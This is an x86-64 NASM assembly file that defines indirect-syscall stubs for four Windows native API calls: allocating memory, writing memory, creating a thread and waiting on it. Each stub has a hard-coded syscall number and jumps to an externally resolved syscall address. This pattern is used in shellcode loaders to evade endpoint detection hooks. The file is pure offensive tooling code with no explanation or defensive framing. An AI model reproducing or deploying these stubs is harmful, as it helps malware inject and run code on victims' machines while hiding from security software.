global _NtAllocateVirtualMemory_stub
global _NtWriteVirtualMemory_stub
global _NtCreateThreadEx_stub
global _NtWaitForSingleObject_stub

extern sysAddrNtAllocateVirtualMemory
extern sysAddrNtWriteVirtualMemory
extern sysAddrNtCreateThreadEx
extern sysAddrNtWaitForSingleObject

section .text

_NtAllocateVirtualMemory_stub:
    mov r10, rcx
    mov eax, 0x18
    jmp qword [rel sysAddrNtAllocateVirtualMemory]

_NtWriteVirtualMemory_stub:
    mov r10, rcx
    mov eax, 0x3A
    jmp qword [rel sysAddrNtWriteVirtualMemory]

_NtCreateThreadEx_stub:
    mov r10, rcx
    mov eax, 0xC7
    jmp qword [rel sysAddrNtCreateThreadEx]

_NtWaitForSingleObject_stub:
    mov r10, rcx
    mov eax, 0x4
    jmp qword [rel sysAddrNtWaitForSingleObject]
